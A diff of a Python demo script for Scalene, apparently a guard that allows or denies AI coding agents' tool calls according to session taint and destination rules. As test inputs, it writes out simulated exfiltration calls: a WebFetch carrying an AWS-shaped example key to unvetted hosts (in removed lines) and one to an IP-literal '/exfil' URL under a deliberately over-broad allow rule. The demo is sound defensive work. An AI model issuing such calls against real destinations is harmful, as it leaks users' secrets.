@@ -1,14 +1,14 @@
 #!/usr/bin/env python3
-"""Runnable demo (STORY-903): Scalene stopping a real data-exfiltration attempt,
-plus a clear contrast of tainted vs. untainted tool calls under Scalene's actual
-default posture and its stricter alternative (2026-07-16, direct user request).
+"""Runnable demo (STORY-903): Scalene's rule-driven access control, blocking
+an unrecognized destination once a session is no longer clean, and showing
+what it actually takes to clear one (2026-07-17, docs/ARCHITECTURE.md sec15,
+direct user design session — replaces the prior masking-centric demo).
 
 Calls the real, installed `scalene-guard`/`scg` binaries as subprocesses with
 real hook JSON on stdin - the same entry point Claude Code uses - rather than
 calling internal functions directly (docs/ARCHITECTURE.md sec 12.1). No real
-network egress occurs: scalene-guard only ever decides allow/mask/block, it
-never performs the tool call itself, so the masked/unmasked value shown below
-*is* the demonstration, not a mocked stand-in for one.
+network egress occurs: scalene-guard only ever decides allow/deny, it never
+performs the tool call itself.
 """
 
 from __future__ import annotations
@@ -21,8 +21,6 @@ from pathlib import Path
 
 GUARD = Path(sys.executable).parent / "scalene-guard"
 SCG = Path(sys.executable).parent / "scg"
-
-FAKE_SECRET = "AKIAIOSFODNN7EXAMPLE"  # AWS access-key-ID shape (detect-secrets recognizes this)
 
 
 def _call_guard(payload: dict, state_dir: Path, policy_path: Path, cache_path: Path) -> dict:
@@ -54,6 +52,10 @@ def _onboard(target: str, cache_path: Path) -> str:
     return result.stdout.strip()
 
 
+def _decision(result: dict) -> str:
+    return result["hookSpecificOutput"]["permissionDecision"]
+
+
 def run() -> int:
     if not GUARD.exists():
         print(
@@ -62,151 +64,177 @@ def run() -> int:
         )
         return 1
 
-    print("=== Scalene demo: stopping a real data-exfiltration attempt ===")
+    print("=== Scalene demo: rule-driven access control ===")
     print()
-    print("No configuration file is used for Parts 1-3 — this shows Scalene's")
-    print("out-of-the-box behavior, before you've written any rules of your own.")
+    print("Trust decisions are always explicit and validated — never automatic.")
+    print("A fresh session starts clean; touching anything unrecognized taints it;")
+    print("once tainted, every further destination needs an explicit, validated rule.")
     print()
 
     with tempfile.TemporaryDirectory() as tmp:
         state_dir = Path(tmp) / "state"
-        policy_path = Path(tmp) / "scalene_policy.yaml"  # intentionally does not exist
+        empty_policy_path = Path(tmp) / "scalene_policy_empty.yaml"
+        empty_policy_path.write_text("")
         cache_path = Path(tmp) / "scan_cache.json"
 
-        print("--- Part 1: an ordinary session becomes tainted ---")
+        print("--- Part 1: a clean session reads a file ---")
         print()
-        print("Step 1 — An assistant reads a file.")
-        _call_guard(
+        print("Step 1 — An assistant reads a file nothing has ever classified.")
+        result = _call_guard(
             {
                 "hook_event_name": "PreToolUse",
                 "session_id": "demo",
                 "tool_name": "Read",
-                "tool_input": {"file_path": "secret.txt"},
+                "tool_input": {"file_path": "notes.txt"},
             },
             state_dir,
-            policy_path,
+            empty_policy_path,
             cache_path,
         )
-        print("  -> Allowed. Nothing is flagged yet — this is the first thing to happen.")
-        print("     Labels so far: session not yet tainted, nothing scanned.")
+        if _decision(result) != "allow":
+            print("\nDemo failed: the first call on a clean session was not allowed.", file=sys.stderr)
+            return 1
+        print("  -> Allowed. Session was clean, so this proceeds — but the file wasn't")
+        print("     recognized by any rule, so the session is now tagged trust: low.")
+        print("     (Fail-safe: we don't know what's in an unclassified file, so once")
+        print("     one has been touched, later destinations need explicit clearance.)")
         print()
 
-        print(f"Step 2 — The file turns out to contain something sensitive: {FAKE_SECRET!r}")
-        _call_guard(
-            {
-                "hook_event_name": "PostToolUse",
-                "session_id": "demo",
-                "tool_name": "Read",
-                "tool_response": {"content": FAKE_SECRET},
-            },
-            state_dir,
-            policy_path,
-            cache_path,
-        )
-        print("  -> Scalene now remembers: this session has touched sensitive data.")
-        print("     Labels now: session TAINTED (sensitive=true, untrusted=true) — sticky")
-        print("     for the rest of the session, even across many unrelated actions.")
+        print("--- Part 2: an unrecognized destination is blocked ---")
         print()
-
-        print("--- Part 2: tainted session + an unverified destination (default: mode=mask) ---")
-        print()
-        print("Step 3 — The assistant tries to send that same value to a destination")
-        print("Scalene has never seen before.")
+        print("Step 2 — The assistant tries to reach an external site.")
         result = _call_guard(
             {
                 "hook_event_name": "PreToolUse",
                 "session_id": "demo",
                 "tool_name": "WebFetch",
-                "tool_input": {"url": "https://never-seen.example.com", "prompt": FAKE_SECRET},
+                "tool_input": {"url": "https://partner.example.com/api", "prompt": "summarize this"},
             },
             state_dir,
-            policy_path,
+            empty_policy_path,
             cache_path,
         )
-        decision = result["hookSpecificOutput"]["permissionDecision"]
-        masked_value = result["hookSpecificOutput"].get("updatedInput", {}).get("prompt")
-
-        if decision != "allow" or masked_value == FAKE_SECRET:
-            print("\nDemo failed: the secret was not masked as expected.", file=sys.stderr)
+        if _decision(result) != "deny":
+            print("\nDemo failed: an unrecognized destination from a tainted session was not blocked.", file=sys.stderr)
             return 1
-
-        print(f"  -> Scalene stepped in. What would have gone out reads: {masked_value!r}")
-        print("     Labels: destination NOT YET VERIFIED (no scan has completed for it) —")
-        print("     that's a fail-safe default, not a known-bad finding. The real secret")
-        print("     never left in the clear.")
-        print()
-        print("  Scalene also printed a ready-to-run command for the one case where you")
-        print("  actually meant to allow this exact call going forward:")
-        print(f"    {result['systemMessage'].splitlines()[-1]}")
+        print(f"  -> {result['hookSpecificOutput']['permissionDecisionReason']}")
         print()
 
-        print("--- Part 3: the SAME tainted session meets a VETTED destination ---")
+        print("--- Part 3: explicitly clearing a destination ---")
         print()
-        print("Step 4 — Suppose you'd already verified a different destination is fine,")
-        print("by running the real onboarding command yourself:")
-        onboard_output = _onboard("https://trusted-partner.example.com", cache_path)
-        print(f"    $ scg onboard --target https://trusted-partner.example.com")
+        print("Step 3 — Verify it for real (an actual reputation check, not a declaration):")
+        onboard_output = _onboard("https://partner.example.com/api", cache_path)
+        print(f"    $ scg onboard --target https://partner.example.com/api")
         print(f"    {onboard_output}")
         print()
-
-        print("Step 5 — The assistant sends the same kind of sensitive value there instead.")
-        result2 = _call_guard(
+        print("Step 4 — Verification alone isn't enough on its own — write a rule saying")
+        print("what to actually do with a verified destination:")
+        allow_policy_path = Path(tmp) / "scalene_policy_allow.yaml"
+        allow_policy_path.write_text(
+            "rules:\n"
+            "  - tool: \"WebFetch\"\n"
+            "    pattern: \"https://partner\\\\.example\\\\.com/api\"\n"
+            "    sensitivity: public\n"
+            "    mode: allow\n"
+            "    description: \"Reviewed and trusted partner API\"\n"
+        )
+        print("    rules:")
+        print("      - tool: \"WebFetch\"")
+        print("        pattern: \"https://partner\\\\.example\\\\.com/api\"")
+        print("        sensitivity: public")
+        print("        mode: allow")
+        print()
+        print("Step 5 — Retry the exact same call:")
+        result = _call_guard(
             {
                 "hook_event_name": "PreToolUse",
                 "session_id": "demo",
                 "tool_name": "WebFetch",
-                "tool_input": {"url": "https://trusted-partner.example.com", "prompt": FAKE_SECRET},
+                "tool_input": {"url": "https://partner.example.com/api", "prompt": "summarize this"},
             },
             state_dir,
-            policy_path,
+            allow_policy_path,
             cache_path,
         )
-        decision2 = result2["hookSpecificOutput"]["permissionDecision"]
-
-        if decision2 != "allow" or "updatedInput" in result2["hookSpecificOutput"]:
-            print("\nDemo failed: the trusted call was unexpectedly modified.", file=sys.stderr)
+        if _decision(result) != "allow":
+            print("\nDemo failed: a validated, explicitly-allowed destination was still blocked.", file=sys.stderr)
             return 1
-
-        print(f"  -> Allowed, unchanged: {FAKE_SECRET!r} — Scalene didn't even scan the content this time.")
-        print("     Labels: destination VERIFIED TRUSTED (a real reputation check passed).")
-        print()
-        print("  This is the real tradeoff of onboarding: trusting a destination means")
-        print("  Scalene stops CHECKING CONTENT for calls to it, not just stops caring")
-        print("  where the data came from. Onboard destinations you actually trust — it's")
-        print("  a real exemption from scanning, not a formality.")
+        print("  -> Allowed. Validated (real scan passed) + explicitly ruled — this bypasses")
+        print("     the block-when-tainted gate entirely, which is the whole point of")
+        print("     declaring trust for it.")
         print()
 
-        print("--- Part 4: a stricter action — mode: block instead of the default mask ---")
+        print("--- Part 4: the rule doesn't leak to a different destination ---")
         print()
-        print("Step 6 — Same never-seen destination as Part 2, but configured with")
-        print("mode: block instead of Scalene's default (mode: mask):")
-        block_policy_path = Path(tmp) / "scalene_policy_block.yaml"
-        block_policy_path.write_text("defaults:\n  mode: block\n")
-        result3 = _call_guard(
+        print("Step 6 — Same policy file, a destination nobody reviewed:")
+        result = _call_guard(
             {
                 "hook_event_name": "PreToolUse",
                 "session_id": "demo",
                 "tool_name": "WebFetch",
-                "tool_input": {"url": "https://also-never-seen.example.com", "prompt": FAKE_SECRET},
+                "tool_input": {"url": "https://a-different-destination.example.net", "prompt": "summarize this"},
             },
             state_dir,
-            block_policy_path,
+            allow_policy_path,
             cache_path,
         )
-        decision3 = result3["hookSpecificOutput"]["permissionDecision"]
-
-        if decision3 != "deny":
-            print("\nDemo failed: the call was not denied under mode: block.", file=sys.stderr)
+        if _decision(result) != "deny":
+            print("\nDemo failed: the rule leaked to an unrelated destination.", file=sys.stderr)
             return 1
-
-        print(f"  -> Denied outright ({decision3!r}). Nothing goes out at all — the agent")
-        print("     has to stop and reconsider, instead of continuing with a masked value.")
+        print("  -> Blocked. The rule is scoped to its own pattern — writing it didn't")
+        print("     silently clear anything else.")
         print()
 
-    print("That's the contrast: mask (default) prioritizes keeping the agent working;")
-    print("block stops it cold; onboarding a destination you trust skips content-checking")
-    print("for it entirely. All three are real, observable behaviors of the same binary")
-    print("Claude Code actually calls — nothing above touched the real network.")
+        print("--- Part 5: a known-bad resource is always blocked, rule or not ---")
+        print()
+        print("Step 7 — An IP-literal destination (Scalene's built-in reputation heuristic")
+        print("flags these as untrusted — `scg onboard` correctly refuses to cache it as")
+        print("trusted; this seeds the cache directly with that same real, refused result,")
+        print("skipping the wait for the background scan a live session would trigger):")
+        bad_policy_path = Path(tmp) / "scalene_policy_bad.yaml"
+        bad_policy_path.write_text(
+            "rules:\n"
+            "  - tool: \"WebFetch\"\n"
+            "    pattern: \".*\"\n"
+            "    sensitivity: public\n"
+            "    mode: allow\n"
+            "    description: \"Deliberately over-broad, to prove it still doesn't work\"\n"
+        )
+        cache_path.write_text(
+            json.dumps(
+                {
+                    "reputation:https://203.0.113.42/exfil": {
+                        "label": "untrusted",
+                        "reason": "IP-literal targets are untrusted by default",
+                        "scanned_at": 0.0,
+                    }
+                }
+            )
+        )
+        result = _call_guard(
+            {
+                "hook_event_name": "PreToolUse",
+                "session_id": "demo",
+                "tool_name": "WebFetch",
+                "tool_input": {"url": "https://203.0.113.42/exfil", "prompt": "send this"},
+            },
+            state_dir,
+            bad_policy_path,
+            cache_path,
+        )
+        if _decision(result) != "deny":
+            print("\nDemo failed: a known-bad resource was not blocked despite an allow rule.", file=sys.stderr)
+            return 1
+        print(f"  -> {result['hookSpecificOutput']['permissionDecisionReason']} (regardless of the rule above)")
+        print("     A rule can declare intent, but it never overrides a real, validated")
+        print("     bad finding — this is true even for the deliberately broad")
+        print("     pattern: \".*\" rule above.")
+        print()
+
+    print("That's the model: nothing is trusted by default, unrecognized destinations")
+    print("get blocked once a session is no longer clean, and clearing one always takes")
+    print("two explicit steps — a real scan, and a rule saying what to do about it. A")
+    print("validated bad finding overrides any rule, no matter how broad.")
     print()
     print("Next: docs/GETTING_STARTED.md to try this yourself, or docs/USER_GUIDE.md")
     print("for the full command reference.")
